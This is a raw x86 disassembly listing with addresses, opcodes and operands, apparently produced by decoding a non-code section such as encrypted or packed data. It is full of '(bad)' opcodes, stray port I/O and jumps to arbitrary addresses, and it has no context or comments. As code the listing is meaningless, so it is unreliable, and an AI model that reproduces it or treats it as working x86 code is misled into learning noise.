  412f03:	sub    ebp,DWORD PTR [esi-0x5d]
  412f06:	into   
  412f07:	nop
  412f08:	shr    bh,cl
  412f0a:	pop    edi
  412f0b:	rcl    edx,1
  412f0d:	(bad)  
  412f0e:	dec    esi
  412f0f:	jg     0x412f3c
  412f11:	loope  0x412f13
  412f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f14:	sub    DWORD PTR ds:0x7078eb3c,edi
  412f1a:	les    esi,FWORD PTR [ecx+0x48bfd346]
  412f20:	push   0x3638adfa
  412f25:	and    BYTE PTR [esi-0x60eba74e],bh
  412f2b:	and    ebp,DWORD PTR [esi]
  412f2d:	sbb    eax,0x4bf95882
  412f32:	add    eax,0x10600330
  412f37:	out    dx,eax
  412f38:	mov    bl,0x75
  412f3a:	lock sub eax,0x1b466618
  412f40:	into   
  412f41:	or     al,0x5f
  412f43:	xchg   edi,eax
  412f44:	or     BYTE PTR [esi+0x15],cl
  412f47:	retf   
  412f48:	cli    
  412f49:	mov    edi,0x4f0c6616
  412f4e:	out    dx,eax
  412f4f:	jnp    0x412f62
  412f51:	(bad)  
  412f52:	ja     0x412fd2
  412f54:	repz mov es,WORD PTR [ecx]
  412f57:	sbb    DWORD PTR [ebp+0x131dde5c],0x4793404a
  412f61:	imul   edx,DWORD PTR [eax],0xb5a55188
  412f67:	add    BYTE PTR [ebx+ebp*2],ah
  412f6a:	dec    esi
  412f6b:	sbb    DWORD PTR cs:[esi+edi*1],esp
  412f6f:	scas   al,BYTE PTR es:[edi]
  412f70:	sub    cl,al
  412f72:	and    BYTE PTR [ebx-0x20],bl
  412f75:	sub    al,0x19
  412f77:	xor    BYTE PTR [ecx+0x4b126f11],bh
  412f7d:	ret    
  412f7e:	retf   
  412f7f:	(bad)  
  412f80:	adc    eax,0xe083ac68
  412f85:	iret   
  412f86:	sbb    DWORD PTR [edx],eax
  412f88:	sub    DWORD PTR [edi+edx*8-0x60],ecx
  412f8c:	jmp    0x412f56
  412f8e:	jno    0x412f47
  412f90:	popf   
  412f91:	sar    BYTE PTR [eax-0x1e362f08],1
  412f97:	push   0x7f85257e
  412f9c:	aam    0x48
  412f9e:	int3   
  412f9f:	aam    0xd8
  412fa1:	fiadd  DWORD PTR [ebx+0xb759eed]
  412fa7:	mov    eax,ds:0x4d280b08
  412fac:	in     eax,dx
  412fad:	js     0x412fe4
  412faf:	scas   eax,DWORD PTR es:[edi]
  412fb0:	inc    ebx
  412fb1:	mov    BYTE PTR [edx-0x52],al
  412fb4:	mov    cl,0xeb
  412fb6:	sbb    ch,BYTE PTR [ebx+eax*8-0x25]
  412fba:	aaa    
  412fbb:	call   0xc5f8988d
  412fc0:	jbe    0x41302f
  412fc2:	loop   0x413027
  412fc4:	jno    0x413007
  412fc6:	ins    DWORD PTR es:[edi],dx
  412fc7:	inc    edi
  412fc8:	push   esi
  412fc9:	pop    edx
  412fca:	cmc    
  412fcb:	sub    dl,dl
  412fcd:	test   al,0x89
  412fcf:	mov    esi,0x71ca8cf1
  412fd4:	push   esp
  412fd5:	pop    esp
  412fd6:	fwait
  412fd7:	pop    ds
  412fd8:	xchg   ecx,eax
  412fd9:	arpl   WORD PTR ds:0x1417d653,ax
  412fdf:	jae    0x412fdf
  412fe1:	das    
  412fe2:	jns    0x412fd7
  412fe4:	mov    ecx,0xaced87d0
  412fe9:	dec    edi
  412fea:	push   edx
  412feb:	mov    edi,edi
  412fed:	retf   0x6295
  412ff0:	imul   esp,ecx,0x3f84d66d
  412ff6:	xor    eax,0xbbe9618b
  412ffb:	lahf   
  412ffc:	jecxz  0x412ff4
  412ffe:	les    ecx,FWORD PTR [ebx+eiz*1+0xfab30c8]
  413005:	sub    al,0xb2
  413007:	or     al,0x49
  413009:	shl    DWORD PTR [edx+ebp*1-0x7476a696],0x27
  413011:	(bad)  
  413013:	sahf   
  413014:	shr    al,0x53
  413017:	sub    DWORD PTR [eax-0x62],esp
  41301a:	cwde   
  41301b:	mov    bl,0xbc
  41301d:	rcl    DWORD PTR [edx-0x2e0422a0],cl
  413023:	les    ecx,FWORD PTR es:[esi+ebx*8-0x40]
  413028:	and    al,0xd
  41302a:	inc    esp
  41302b:	not    DWORD PTR [edx+0x1b]
  41302e:	push   esi
  41302f:	pop    esi
  413030:	mov    esi,0x6fc75172
  413035:	in     al,0x5c
  413037:	pop    ecx
  413038:	pop    ebp
  413039:	and    eax,0xa2d24efe
  41303e:	xor    al,bh
  413040:	mov    eax,ds:0xd8765125
  413045:	pop    ss
  413046:	mov    al,BYTE PTR [esi+0x785bdba8]
  41304c:	xchg   esp,eax
  41304d:	inc    ebp
  41304e:	pop    esi
  41304f:	cwde   
  413050:	jmp    0x41307c
  413052:	cmp    eax,0xbfbb8cb0
  413057:	sub    al,BYTE PTR [ebx]
  413059:	xchg   edx,eax
  41305a:	cld    
  41305b:	push   ebp
  41305c:	inc    esp
  41305d:	adc    DWORD PTR [ecx],0xffffffd3
  413060:	sbb    BYTE PTR [edx+0x51706cba],bh
  413066:	enter  0xf48e,0xff
  41306a:	shr    DWORD PTR [eax-0x4e5a42e1],0x6a
  413071:	rol    BYTE PTR [eax],1
  413073:	lods   al,BYTE PTR ds:[esi]
  413074:	and    ch,BYTE PTR [ebx+eax*8]
  413077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413078:	mov    ebx,fs
  41307a:	aam    0x26
  41307c:	or     BYTE PTR [esi-0x43c3e9f7],dh
  413082:	sbb    BYTE PTR [ecx],0x65
  413085:	sar    DWORD PTR [eax+0x2e],cl
  413088:	jbe    0x413069
  41308a:	xor    eax,DWORD PTR [ecx-0x536b0d25]
  413090:	mov    dh,0xbf
  413092:	or     eax,DWORD PTR [ecx-0x40ad7956]
  413098:	dec    esi
  413099:	das    
  41309a:	retf   
  41309b:	push   eax
  41309c:	or     BYTE PTR [eax+edx*4-0x1d],cl
  4130a0:	cmp    ecx,DWORD PTR [ecx+0x5c]
  4130a3:	clc    
  4130a4:	bnd jae 0x41306a
  4130a7:	ret    0xf44f
  4130aa:	shl    dh,0x53
  4130ad:	pop    es
  4130ae:	jae    0x4130d2
  4130b0:	out    dx,eax
  4130b1:	aam    0x6d
  4130b3:	jmp    0x837b:0x105a0ceb
  4130ba:	jecxz  0x4130b8
  4130bc:	mov    al,ah
  4130be:	sbb    BYTE PTR es:[esi-0x7bcf66bc],bl
  4130c5:	dec    eax
  4130c6:	fucomp st(7)
  4130c8:	ja     0x413094
  4130ca:	arpl   si,cx
  4130cc:	imul   esp,edi,0xffffffb2
  4130cf:	push   ecx
  4130d0:	shr    BYTE PTR [ebx],cl
  4130d2:	add    eax,0xcf1894f8
  4130d7:	jnp    0x413083
  4130d9:	ret    0xdac0
  4130dc:	dec    esi
  4130dd:	mov    dh,0x9a
  4130df:	jle    0x413138
  4130e1:	or     edi,esp
  4130e3:	jo     0x41314c
  4130e5:	dec    edi
  4130e6:	inc    esp
  4130e7:	sbb    ecx,esi
  4130e9:	les    esp,FWORD PTR [ecx]
  4130eb:	mov    ds:0xbc067426,al
  4130f0:	and    al,0xd7
  4130f2:	or     al,0x62
  4130f4:	and    al,0x3e
  4130f6:	jp     0x413146
  4130f8:	cvtdq2ps xmm6,XMMWORD PTR gs:[ebp-0x595e721e]
  413100:	inc    eax
  413101:	(bad)  
  413102:	pop    esi
  413103:	int    0x5f
  413105:	mov    eax,ds:0x400a284a
  41310a:	int3   
  41310b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41310c:	shl    DWORD PTR [ebp-0x1554bdd2],0x64
  413113:	mov    ebp,eax
  413115:	dec    ebx
  413116:	stos   DWORD PTR es:[edi],eax
  413117:	(bad)  
  413118:	mov    ecx,0xd1ea1f04
  41311d:	add    al,0x47
  41311f:	loope  0x4130dd
  413121:	fidiv  WORD PTR [ebx+0x1efca718]
  413127:	jecxz  0x4131a6
  413129:	pop    edi
  41312a:	jnp    0x413194
  41312c:	ins    BYTE PTR es:[edi],dx
  41312d:	cmp    ecx,0x53
  413130:	mov    al,0xff
  413132:	popa   
  413133:	mov    ?,WORD PTR [edx]
  413135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413136:	jecxz  0x4130c6
  413138:	xor    BYTE PTR [eax],ah
  41313a:	out    dx,al
  41313b:	mov    al,0xc4
  41313d:	sub    esi,DWORD PTR [ebp+0x5608730f]
  413143:	push   eax
  413144:	icebp  
  413145:	lock cwde 
  413147:	add    bl,BYTE PTR [eax+0x1f2d4d39]
  41314d:	ret    0xbc60
  413150:	movntps XMMWORD PTR [ecx],xmm5
  413153:	repz xor dh,bh
  413156:	jmp    0x4131c1
  413158:	cmc    
  413159:	ins    DWORD PTR es:[edi],dx
  41315a:	ret    0xe596
  41315d:	icebp  
  41315e:	inc    edi
  41315f:	mov    ah,0x7d
  413161:	shl    ah,1
  413163:	loopne 0x4131b2
  413165:	mov    cl,0x74
  413167:	xchg   edi,eax
  413168:	or     BYTE PTR [ecx-0x80],0x20
  41316c:	fmul   DWORD PTR [eax]
  41316e:	mov    bh,0xf8
  413170:	jp     0x413142
  413172:	dec    ebx
  413173:	dec    eax
  413174:	add    DWORD PTR [esi-0x24],edi
  413177:	mov    ecx,0xdbc7b758
  41317c:	cmp    ah,bl
  41317e:	arpl   WORD PTR [edi-0x6b3eed72],sp
  413184:	call   0x300351c0
  413189:	(bad)  
  41318a:	mov    ss,WORD PTR [edi]
  41318c:	mov    ?,WORD PTR [ebp+0x32465a9d]
  413192:	imul   BYTE PTR [ebp+ebp*8+0x168dad3e]
  413199:	stos   DWORD PTR es:[edi],eax
  41319a:	(bad)  
  41319b:	test   al,0xdc
  41319d:	stos   BYTE PTR es:[edi],al
  41319e:	imul   eax,DWORD PTR es:[edi-0x74],0xffffffed
  4131a3:	adc    eax,0x977b4307
  4131a8:	xchg   ecx,eax
  4131a9:	les    edx,FWORD PTR [ebp+0x49]
  4131ac:	xor    al,0xde
  4131ae:	imul   ebp,DWORD PTR [ebp-0x710ee69b],0x7b0c0c7c
  4131b8:	sub    ebx,DWORD PTR [esp]
  4131bb:	pop    ebx
  4131bc:	call   0xcbbde86b
  4131c1:	ds bswap ecx
  4131c4:	popa   
  4131c5:	xor    bh,BYTE PTR [eax+0x70234810]
  4131cb:	cmp    ch,al
  4131cd:	mov    edi,0xd125a91c
  4131d2:	push   ss
  4131d3:	rcr    bl,1
  4131d5:	push   ds
  4131d6:	cwde   
  4131d7:	mov    ds:0x40b9ff05,eax
  4131dc:	test   al,0x4f
  4131de:	rcl    BYTE PTR ss:[eax],0x30
  4131e2:	pop    esp
  4131e3:	ss das 
  4131e5:	xchg   BYTE PTR [edx],bh
  4131e7:	(bad)  
  4131e8:	enter  0x9929,0xe2
  4131ec:	jb     0x41322a
  4131ee:	clc    
  4131ef:	pop    edx
  4131f0:	cmp    ebx,DWORD PTR [ebx]
  4131f2:	mov    al,ds:0x36dd0cd9
  4131f7:	pop    eax
  4131f8:	ds ins DWORD PTR es:[edi],dx
  4131fa:	out    0xfc,al
  4131fc:	dec    esi
  4131fd:	fst    QWORD PTR [ecx-0x6d4af74b]
  413203:	pop    esp
  413204:	ins    BYTE PTR es:[edi],dx
  413205:	jb     0x41326a
  413207:	xor    ebx,DWORD PTR [ecx]
  413209:	push   eax
  41320a:	and    ebp,DWORD PTR [ecx-0x78]
  41320d:	pop    ss
  41320e:	mov    dl,0xf2
  413210:	mov    bh,0xe4
  413212:	fsubr  DWORD PTR [edx+0x39f5f63f]
  413218:	stc    
  413219:	mov    edi,0x62de8e25
  41321e:	repz inc edx
  413220:	mov    ebp,0x20fff632
  413225:	mov    ecx,0x98c3e4f9
  41322a:	inc    esp
  41322b:	jmp    0x40c8:0x41a5a552
  413232:	rcl    BYTE PTR [esi+edx*4-0x50f69a43],cl
  413239:	(bad)  
  41323a:	pop    eax
  41323b:	push   esp
  41323c:	push   ebx
  41323d:	sbb    dl,BYTE PTR [ecx-0x50e2dd16]
  413243:	leave  
  413244:	(bad)  
  413246:	nop
  413247:	mov    dl,BYTE PTR [eax]
  413249:	adc    cl,dh
  41324b:	hlt    
  41324c:	in     eax,0xfb
  41324e:	(bad)  
  41324f:	test   BYTE PTR [edx+eax*8],0x25
  413253:	fcom   DWORD PTR [edi-0x12]
  413256:	or     eax,0x3e78a023
  41325b:	jno    0x4131e5
  41325d:	push   edi
  41325e:	in     eax,dx
  41325f:	mov    edx,0x1b15d129
  413264:	ja     0x413213
  413266:	jp     0x413235
  413268:	(bad)  
  413269:	dec    esp
  41326a:	test   BYTE PTR [edi-0x52d1c7fb],ch
  413270:	mov    bl,0xb3
  413272:	pop    ss
  413273:	fdiv   DWORD PTR [ecx]
  413275:	xlat   BYTE PTR ds:[ebx]
  413276:	jmp    0xcaacb810
  41327b:	add    al,dl
  41327d:	mov    dh,0xc7
  41327f:	sub    eax,0xa71967a8
  413284:	mov    DWORD PTR [edx*1-0x3eabbddf],eax
  41328b:	adc    edx,DWORD PTR [ecx-0x20b711bd]
  413291:	pop    ss
  413292:	push   0xfffffff2
  413294:	jmp    DWORD PTR [ebx+0x7434c60f]
  41329a:	sbb    esp,eax
  41329c:	mov    ebx,0x5029e7ce
  4132a1:	xchg   eax,esp
  4132a3:	add    BYTE PTR [ecx],bh
  4132a5:	pop    ecx
  4132a6:	cli    
  4132a7:	(bad)  
  4132a8:	fxam   
  4132aa:	cmp    al,BYTE PTR [ecx+0x7b]
  4132ad:	scas   eax,DWORD PTR es:[edi]
  4132ae:	or     bl,BYTE PTR [edx]
  4132b0:	out    dx,eax
  4132b1:	es or  eax,0xd8396259
  4132b7:	inc    eax
  4132b8:	out    0xca,eax
  4132ba:	inc    ebx
  4132bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132bc:	and    dl,dl
  4132be:	in     al,dx
  4132bf:	mov    DWORD PTR [eax+0x3f],ebp
  4132c2:	dec    ebp
  4132c3:	add    dl,BYTE PTR [ecx+0x5]
  4132c6:	je     0x413328
  4132c8:	and    al,0x26
  4132ca:	call   0x3887730f
  4132cf:	xor    al,0xaf
  4132d1:	dec    BYTE PTR [edx-0x71]
  4132d4:	cld    
  4132d5:	scas   al,BYTE PTR es:[edi]
  4132d6:	jg     0x41327c
  4132d8:	inc    ebp
  4132d9:	pop    eax
  4132da:	into   
  4132db:	adc    al,0xc6
  4132dd:	jmp    0xda1b:0x244f6bbf
  4132e4:	fisubr WORD PTR [esi-0xc]
  4132e7:	ins    DWORD PTR es:[edi],dx
  4132e8:	pop    esp
  4132e9:	pcmpeqw mm7,QWORD PTR [edx+0x6b]
  4132ed:	fwait
  4132ee:	into   
  4132ef:	clc    
  4132f0:	popa   
  4132f1:	jns    0x4132f8
  4132f3:	loopne 0x413319
  4132f5:	popa   
  4132f6:	mov    bl,0xfc
  4132f8:	outs   dx,DWORD PTR ds:[esi]
  4132f9:	mov    al,ds:0x1384e17e
  4132fe:	sahf   
  4132ff:	add    BYTE PTR [edi-0x7f],0x88
  413303:	xchg   edx,eax
  413304:	mov    cl,0xe7
  413306:	mov    esi,0x8a41cf97
  41330b:	(bad)  
  41330c:	retf   
  41330d:	ret    
  41330e:	js     0x4132b5
  413310:	jo     0x413391
  413312:	das    
  413313:	xlat   BYTE PTR ds:[ebx]
  413314:	arpl   WORD PTR [edx+0x7],di
  413317:	pop    ebx
  413318:	nop
  413319:	push   ds
  41331a:	inc    ecx
  41331b:	div    BYTE PTR [edx+0x4]
  41331e:	mov    eax,ds:0xd8c27e53
  413323:	mov    ebx,0x938cad56
  413328:	xchg   BYTE PTR [ebp-0x27d71af2],ch
  41332e:	das    
  41332f:	ds fmul st,st(2)
  413332:	xchg   edi,eax
  413333:	cdq    
  413334:	dec    ebp
  413335:	pop    esi
  413336:	mov    al,0x23
  413338:	fisub  WORD PTR [ecx+0x62]
  41333b:	mov    dh,0xe9
  41333d:	int    0x1e
  41333f:	adc    eax,0xeaeab763
  413344:	test   al,0x96
  413346:	rol    ecx,0x4d
  413349:	and    eax,0x9c83ca57
  41334e:	push   cs
  41334f:	push   0xf73cc56a
  413354:	pushf  
  413355:	or     ch,ah
  413357:	hlt    
  413358:	jmp    0x48c2a6bc
  41335d:	add    cl,bh
  41335f:	jmp    FWORD PTR [eax]
  413361:	mov    esp,0x67287c53
  413366:	inc    ebp
  413367:	adc    eax,0xfe8f7a62
  41336c:	fisttp QWORD PTR [ecx+0x526ef30a]
  413372:	or     al,0x9e
  413374:	push   0xb7802d77
  413379:	lods   al,BYTE PTR ds:[esi]
  41337a:	fs fmul st,st(0)
  41337d:	gs clc 
  41337f:	in     al,0xe7
  413381:	xor    edx,eax
  413383:	repz sbb DWORD PTR [ebx],ecx
  413386:	xchg   edx,eax
  413387:	scas   al,BYTE PTR es:[edi]
  413388:	xchg   ebx,eax
  413389:	mov    ah,0x2
  41338b:	daa    
  41338c:	(bad)  
  41338d:	daa    
  41338e:	pop    edi
  41338f:	or     dl,al
  413391:	outs   dx,BYTE PTR ds:[esi]
  413392:	jle    0x413411
  413394:	xor    bh,al
  413396:	out    dx,al
  413397:	fbstp  TBYTE PTR [ecx+0x2168e646]
  41339d:	in     al,0x4e
  41339f:	xchg   ecx,eax
  4133a0:	pusha  
  4133a1:	dec    ecx
  4133a2:	mov    edi,0xf64e1747
  4133a7:	jle    0x4133ca
  4133a9:	pop    eax
  4133aa:	mov    al,ds:0xbc673187
  4133af:	push   eax
  4133b0:	(bad)  
  4133b1:	out    0xc4,ax
  4133b4:	mov    WORD PTR [esi-0x5f],es
  4133b7:	and    edx,eax
  4133b9:	or     ecx,DWORD PTR ds:0xcd6bc81f
  4133bf:	mov    ebp,?
  4133c1:	cwde   
  4133c2:	dec    ebp
  4133c3:	mov    cl,0x3e
  4133c5:	rcl    BYTE PTR [ecx+0x4d],1
  4133c8:	cs adc si,ax
  4133cc:	push   esp
  4133cd:	mov    ebp,0x48fbf2b3
  4133d2:	mov    edx,0x60f87b1
  4133d7:	mov    DWORD PTR [edi],esp
  4133d9:	js     0x4133e1
  4133db:	call   DWORD PTR [ebx+0x12]
  4133de:	aas    
  4133df:	mov    ds:0x976289ad,eax
  4133e4:	sbb    edx,eax
  4133e6:	mov    BYTE PTR [eax],dh
  4133e8:	es mov dh,0x73
  4133eb:	retf   
  4133ec:	xor    dh,BYTE PTR [edi-0x20c8b3f4]
  4133f2:	add    ecx,DWORD PTR [edi]
  4133f4:	inc    ecx
  4133f5:	addr16 pop ebp
  4133f7:	xchg   ebx,eax
  4133f8:	and    eax,0x4c99c742
  4133fd:	inc    ebx
  4133fe:	ret    0x6b11
  413401:	push   eax
  413402:	mov    edi,0xf776c8e
  413407:	outs   dx,BYTE PTR ds:[esi]
  413408:	push   ds
  413409:	mov    dh,0xd2
  41340b:	in     eax,dx
  41340c:	mov    al,0xb3
  41340e:	les    ebp,FWORD PTR [eax]
  413410:	je     0x413455
  413412:	mov    ebx,0xbc0726cd
  413417:	dec    eax
  413418:	push   0x3d
  41341a:	stos   BYTE PTR es:[edi],al
  41341b:	xchg   edi,eax
  41341c:	lods   eax,DWORD PTR cs:[esi]
  41341e:	pop    edi
  41341f:	repnz push ecx
  413421:	sub    esi,ebp
  413423:	adc    esp,DWORD PTR [edi+0x4e]
  413426:	pop    ebp
  413427:	pop    ebx
  413428:	stos   DWORD PTR es:[edi],eax
  413429:	cmc    
  41342a:	dec    edx
  41342b:	push   edi
  41342c:	add    ecx,ebp
  41342e:	arpl   WORD PTR [ebx+0x6342b515],si
  413434:	lods   al,BYTE PTR ds:[esi]
  413435:	shl    BYTE PTR ss:[ecx],1
  413438:	sbb    ebx,DWORD PTR [ebx+0x12]
  41343b:	ret    0xaa0
  41343e:	aam    0x22
  413440:	inc    esp
  413441:	sar    BYTE PTR [esp+ecx*2],cl
  413444:	dec    edi
  413445:	dec    eax
  413446:	pop    ds
  413447:	sub    edi,DWORD PTR [eax+0x71e6594b]
  41344d:	jnp    0x4134c0
  41344f:	(bad)  
  413450:	fdiv   DWORD PTR [ebp+0x5f7f02a8]
  413456:	push   ecx
  413457:	cwde   
  413458:	rol    DWORD PTR [esi+0x19],0xf9
  41345c:	(bad)  
  41345d:	dec    edi
  41345e:	pop    ecx
  41345f:	push   edi
  413460:	xlat   BYTE PTR ds:[ebx]
  413461:	mov    ebx,0x376b1414
  413466:	xchg   ebp,eax
  413467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413468:	mov    DWORD PTR es:[ecx-0x643d1cfd],0x7984b407
  413473:	(bad)  
  413474:	dec    edi
  413475:	push   0x1f
  413477:	sub    ebp,edx
  413479:	(bad)  
  41347a:	cmp    bl,BYTE PTR ds:[edx]
  41347d:	push   0x1b
  41347f:	fnstenv [edi+ebx*1]
  413482:	jg     0x4134c1
  413484:	mov    esi,0x4059a00f
  413489:	(bad)  
  41348a:	aam    0xc1
  41348c:	nop
  41348d:	sub    eax,0x501f2b34
  413492:	or     DWORD PTR [esi+0x163b67f6],ecx
  413498:	cmp    esi,edi
  41349a:	lahf   
  41349b:	ret    0x9fc1
  41349e:	xchg   ebx,eax
  41349f:	(bad)  
  4134a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134a1:	xor    cl,BYTE PTR [ebp+0x9]
  4134a4:	mov    ebx,0xa21f24c0
  4134a9:	jbe    0x4134d8
  4134ab:	push   esi
  4134ac:	fild   QWORD PTR [ecx]
  4134ae:	and    al,0x80
  4134b0:	aaa    
  4134b1:	mov    eax,0x17bbacd9
  4134b6:	daa    
  4134b7:	push   ebx
  4134b8:	loop   0x4134d3
  4134ba:	pop    edx
  4134bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134bc:	mov    dl,0x6
  4134be:	mov    dh,0xe6
  4134c0:	ficom  WORD PTR [ebx+0x43d1139c]
  4134c6:	push   eax
  4134c7:	cmp    edx,DWORD PTR [eax-0x41]
  4134ca:	(bad)  
  4134cb:	sbb    ebx,eax
  4134cd:	push   esp
  4134ce:	dec    ebx
  4134cf:	lahf   
  4134d0:	lock mov edi,0x4370641a
  4134d6:	pop    eax
  4134d7:	int3   
  4134d8:	pushf  
  4134d9:	scas   al,BYTE PTR es:[edi]
  4134da:	jb     0x4134df
  4134dc:	(bad)  [edx+0x3a3d79c7]
  4134e2:	bound  esp,QWORD PTR [edx+eiz*8-0x24430e88]
  4134e9:	sbb    DWORD PTR [edi-0x71],0xfffffff4
  4134ed:	test   BYTE PTR cs:[ecx],cl
  4134f0:	aas    
  4134f1:	pop    esi
  4134f2:	add    al,0x6e
  4134f4:	mov    al,0xc
  4134f6:	or     edi,DWORD PTR [edx+eiz*8-0x1b79e91]
  4134fd:	xchg   ebx,eax
  4134fe:	pop    ebp
  4134ff:	call   0x7fa1:0x3c9c8f7d
  413506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413507:	dec    ebp
  413508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413509:	fidiv  WORD PTR [ecx+edi*1]
  41350c:	cmp    BYTE PTR [ecx-0x725caecb],ah
  413512:	or     dl,BYTE PTR [edx+0xf5cf86b]
  413518:	xchg   edx,eax
  413519:	cwde   
  41351a:	test   eax,0xacc41268
  41351f:	push   ecx
  413520:	cmp    BYTE PTR [ecx],cl
  413522:	add    DWORD PTR [ebx+0x4f5eadf4],eax
  413528:	leave  
  413529:	(bad)  
  41352a:	call   0x295c:0xecbdea67
  413531:	add    al,0xbd
  413533:	les    ebx,FWORD PTR [ebp+0x61]
  413536:	and    DWORD PTR [ebp+0x43ffc416],ebp
  41353c:	fidiv  DWORD PTR [esp+edi*2]
  41353f:	mov    cl,0xf5
  413541:	and    BYTE PTR [edx-0x66dc9ec3],bh
  413547:	mov    ebp,0xb5b0b407
  41354c:	repz xchg ecx,eax
  41354e:	out    0x68,al
  413550:	icebp  
  413551:	aaa    
  413552:	lods   eax,DWORD PTR ds:[esi]
  413553:	imul   eax,DWORD PTR [ecx-0x30],0x72e0c1d2
  41355a:	xchg   dh,bl
  41355c:	cdq    
  41355d:	fild   WORD PTR [ebx-0x59]
  413560:	arpl   bp,dx
  413562:	push   es
  413563:	mov    ss,WORD PTR [ecx-0x36]
  413566:	nop
  413567:	out    0x4,al
  413569:	rol    DWORD PTR [ebx],0x5d
  41356c:	gs bnd ret 0x6dc6
  413571:	cld    
  413572:	test   eax,0xcb1be1df
  413577:	xchg   ecx,eax
  413578:	out    0xc8,eax
  41357a:	mov    ebx,0x593ff7a
  41357f:	mov    eax,0xe7afc0f1
  413584:	cmp    ebp,0xffaa5e57
  41358a:	(bad)  
  41358b:	jmp    0x39741f0
  413590:	add    DWORD PTR [edi],0xffffff89
  413593:	mov    edx,0x64be582d
  413598:	test   BYTE PTR [esi+0x70251bc0],ah
  41359e:	out    0x73,al
  4135a0:	jecxz  0x4135f8
  4135a2:	popa   
  4135a3:	test   eax,0x7e310c5e
  4135a8:	jmp    0x6da90caf
  4135ad:	cmp    DWORD PTR [esi+0x5c],edi
  4135b0:	mov    esp,0x6631b926
  4135b5:	pop    edx
  4135b6:	sbb    al,0x84
  4135b8:	pop    es
  4135b9:	test   al,0x28
  4135bb:	mov    ebp,esi
  4135bd:	loopne 0x41361d
  4135bf:	in     eax,0x1
  4135c1:	enter  0x4168,0xb5
  4135c5:	clc    
  4135c6:	imul   edi,DWORD PTR [ecx+0x78bb937d],0x26
  4135cd:	fnstcw WORD PTR [edi]
  4135cf:	mov    esp,0xcc9ff636
  4135d4:	loope  0x413592
  4135d6:	push   ebx
  4135d7:	clc    
  4135d8:	xchg   ebp,eax
  4135d9:	mov    bl,0x9
  4135db:	dec    ecx
  4135dc:	mov    al,0x1e
  4135de:	retf   
  4135df:	and    eax,0x520efefb
  4135e4:	jg     0x4135b0
  4135e6:	into   
  4135e7:	(bad)  
  4135e8:	movntq QWORD PTR [ebx],mm6
  4135eb:	(bad)  
  4135ec:	pop    ss
  4135ed:	dec    ecx
  4135ee:	xchg   DWORD PTR [esi-0x3a],ecx
  4135f1:	push   ecx
  4135f2:	clc    
  4135f3:	pusha  
  4135f4:	and    BYTE PTR [esi+0x66],ch
  4135f7:	retf   0x1e29
  4135fa:	cwde   
  4135fb:	call   0x62a3e464
  413600:	jae    0x4135c7
  413602:	mov    edi,0x244a1448
  413607:	xor    edx,edi
  413609:	ds xor eax,ebx
  41360c:	inc    edi
  41360d:	fmul   QWORD PTR [ecx]
  41360f:	imul   ecx,DWORD PTR ds:0x773d5a95,0xffffff84
  413616:	call   0xf035debd
  41361b:	mov    ds:0xea15b965,al
  413620:	pop    ecx
  413621:	or     edx,ebx
  413623:	mov    eax,0x67420103
  413628:	jns    0x413696
  41362a:	out    dx,eax
  41362b:	(bad)  
  41362c:	push   ebx
  41362d:	loope  0x41365a
  41362f:	pop    ebx
  413630:	xchg   ecx,eax
  413631:	mov    edx,0x9410449e
  413636:	inc    esi
  413637:	sahf   
  413638:	dec    edi
  413639:	inc    ebx
  41363a:	adc    eax,0xb17919a6
  41363f:	xor    al,0x9c
  413641:	in     al,0x23
  413643:	test   eax,edi
  413645:	inc    BYTE PTR es:[esi-0x49]
  413649:	shl    DWORD PTR [eax],0xc4
  41364c:	aam    0x97
  41364e:	mov    ah,0x92
  413650:	dec    ecx
  413651:	sub    BYTE PTR [esi+0x19e15cfb],bh
  413657:	leave  
  413658:	jg     0x4136cc
  41365a:	lahf   
  41365b:	sub    ah,bl
  41365d:	adc    bh,BYTE PTR [ebx+0x3586636]
  413663:	jge    0x4135ea
  413665:	push   ecx
  413666:	pop    esi
  413667:	arpl   WORD PTR [ecx-0x4e31c9e9],dx
  41366d:	arpl   WORD PTR [edx-0x5ea7ef65],bp
  413673:	repnz in al,0xf6
  413676:	(bad)  
  413677:	js     0x413622
  413679:	xor    al,0xa
  41367b:	mov    esi,0x720ea291
  413680:	cmp    al,0xcf
  413682:	jmp    0xfe1c9a0f
  413687:	jp     0x413642
  413689:	loope  0x4136fe
  41368b:	cli    
  41368c:	sub    al,0x75
  41368e:	mov    WORD PTR [edx+0x251067cb],ss
  413694:	cld    
  413695:	das    
  413696:	es aad 0xf7
  413699:	add    DWORD PTR [eax+esi*2],eax
  41369c:	add    dl,BYTE PTR [ecx-0x2b]
  41369f:	retf   
  4136a0:	jmp    FWORD PTR [eax]
  4136a2:	cwde   
  4136a3:	fwait
  4136a4:	jbe    0x41370a
  4136a6:	cmp    eax,0x9659eafc
  4136ab:	add    eax,0x880bbc17
  4136b0:	mov    bh,0x96
  4136b2:	jp     0x4136cf
  4136b4:	out    0xc1,al
  4136b6:	jp     0x4136f0
  4136b8:	ds cld 
  4136ba:	xlat   BYTE PTR ds:[ebx]
  4136bb:	mov    esp,0x7f240edb
  4136c0:	inc    ebp
  4136c1:	sbb    al,BYTE PTR ds:0x6beaf0e5
  4136c7:	inc    eax
  4136c8:	push   eax
  4136c9:	mov    eax,0x2056a3f9
  4136ce:	je     0x41368a
  4136d0:	mov    edi,0x1f9339d4
  4136d5:	pop    ss
  4136d6:	leave  
  4136d7:	xchg   DWORD PTR [ebp+0x5d984213],eax
  4136dd:	outs   dx,BYTE PTR ds:[esi]
  4136de:	retf   
  4136df:	jecxz  0x413731
  4136e1:	mov    al,0xda
  4136e4:	push   ds
  4136e5:	jmp    0x92ee5d40
  4136ea:	or     al,0xf6
  4136ec:	cmp    DWORD PTR [edi],ebp
  4136ee:	in     eax,0xf2
  4136f0:	and    dl,al
  4136f2:	cmp    esp,DWORD PTR [ebx]
  4136f4:	sahf   
  4136f5:	and    eax,DWORD PTR [ecx-0x66]
  4136f8:	retf   
  4136f9:	inc    edi
  4136fa:	pop    ss
  4136fb:	and    edx,DWORD PTR [edx-0x80ef964]
  413701:	call   0xf3fa9f7
